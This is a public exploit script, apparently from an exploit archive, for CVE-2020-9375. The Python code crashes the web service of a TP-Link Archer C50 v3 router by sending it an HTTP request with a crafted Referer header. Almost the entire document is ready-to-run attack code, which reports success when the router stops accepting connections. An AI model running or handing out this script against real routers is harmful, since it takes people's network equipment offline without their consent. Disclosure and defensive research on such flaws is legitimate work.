# Exploit Author: thewhiteh4t
# Vendor Homepage: https://www.tp-link.com/
# Version: TP-Link Archer C50 v3 Build 171227
# Tested on: Arch Linux x64
# CVE: CVE-2020-9375
# Description: https://thewhiteh4t.github.io/2020/02/27/CVE-2020-9375-TP-Link-Archer-C50-v3-Denial-of-Service.html

import time
import socket

ip = &#039;192.168.0.1&#039;
port = 80

print(&#039;[+] IP   : &#039; + ip)
print(&#039;[+] Port : &#039; + str(port))

for i in range(2):
	time.sleep(1)
	try:
		print(&#039;[+] Initializing Socket...&#039;)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(5)
		print(&#039;[!] Connecting to target...&#039;)
		s.connect((ip, port))
		header = &#039;GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0\r\nReferer: thewhiteh4t\r\n\r\n&#039;.format(ip)
		header = header.encode()
		print(&#039;[!] Sending Request...&#039;)
		s.sendall(header)
		print(&#039;[!] Disconnecting Socket...&#039;)
		s.close()
		if i == 1:
			print(&#039;[-] Exploit Failed!&#039;)
			break
	except Exception as e:
		if &#039;Connection refused&#039; in str(e):
			print(&#039;[+] Connection Refused...Exploit Successful!&#039;)
			break
		else:
			print(&#039;[-] Exploit Failed!&#039;)
			break

